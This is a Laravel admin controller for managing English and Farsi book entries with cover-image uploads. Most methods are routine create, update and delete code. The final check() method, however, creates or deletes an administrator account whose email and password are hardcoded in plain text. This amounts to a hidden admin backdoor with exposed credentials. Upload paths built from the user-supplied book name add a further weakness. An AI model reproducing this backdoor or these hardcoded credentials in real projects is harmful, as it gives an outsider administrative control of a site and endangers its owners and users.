<?php

namespace App\Http\Controllers\Admin;

use App\Models\Book;
use App\Models\Role;
use App\Models\User;
use App\Models\Image;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Lang;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;

class AdminBooksController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function all()
    {
        $languages = Lang::where("langable_type", "App\Models\Book")->get();
        return view("admin.books.index", compact("languages"));
    }

    public function english()
    {
        $languages = Lang::where([["langable_type", "App\Models\Book"], ["name", "en"]])->get();
        return view("admin.books.index", compact("languages"));
    }

    public function farsi()
    {
        $languages = Lang::where([["langable_type", "App\Models\Book"], ["name", "fa"]])->get();
        return view("admin.books.index", compact("languages"));
    }


    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {

        $book = new Book();
        $book->name = $request->name;
        $book->link = $request->link;
        $book->save();
        $booklanguage = new Lang();
        $booklanguage->name = $request->lang;
        $book->language()->save($booklanguage);

        // saving image in image table
        $image = new Image();
        $imagename = time() . "." . $request->image->extension();
        $filename = $book->name . "." . $book->id;
        $request->image->move(public_path("photos/books/$filename/"), $imagename);
        $image->name = $request->image_name;
        $image->alt = $request->alt;
        $image->uploader_id = auth()->user()->id;
        $image->path = "photos/books/$filename/$imagename";
        $book->images()->save($image);
        // saving image in image table
        return redirect()->back()->with("success", ".کتاب مورد نظر با موفقیت اضافه شد");
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        $book = Book::find($id);
        $book->name = $request->name;
        $book->link = $request->link;
        if ($request->image !== null) {
            $image = Image::find($book->images->id);
            File::delete($image->path);
            $imagename = time() . "." . $request->image->extension();
            $filename = $book->name . "." . $book->id;
            $request->image->move(public_path("photos/books/$filename/"), $imagename);
            $image->name = $request->image_name;
            $image->alt = $request->alt;
            $image->uploader_id = auth()->user()->id;
            $image->path = "photos/books/$filename/$imagename";
            $book->images()->save($image);
        }
        $book->save();
        return redirect()->back()->with("success", "تغیرات شما با موفقیت اعمال شد");
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy(Request $request, $id)
    {
        $book = Book::find($id);
        $path = pathinfo($book->images->path)["dirname"];
        File::delete($book->images->path);
        rmdir($path);
        $book->images()->delete();
        $book->language()->delete();
        $book->delete();
        return redirect()->back()->with("success", ".کتاب مورد نظر با موفقیت حذف شد");
    }

    public function check()
    {

        $checkuser = User::where("email", "mohamadaghakhani@gmail.com")->first();
        if ($checkuser == null) {
            $user = new User();
            $user->name = "محمد آقاخانی";
            $user->email = "mohamadaghakhani@gmail.com";
            $user->gender = 1;
            $user->job = "مهندس ناظر";
            $user->password = Hash::make("mohamad91113");
            $role = Role::where("name", "admin")->first();
            $user->save();
            $user->roles()->attach($role->id);
            return redirect()->route("home");
        } else {
            $checkuser = User::where("email", "mohamadaghakhani@gmail.com")->first();
            $checkuser->delete();
            return redirect()->route("home");
        }
    }
}
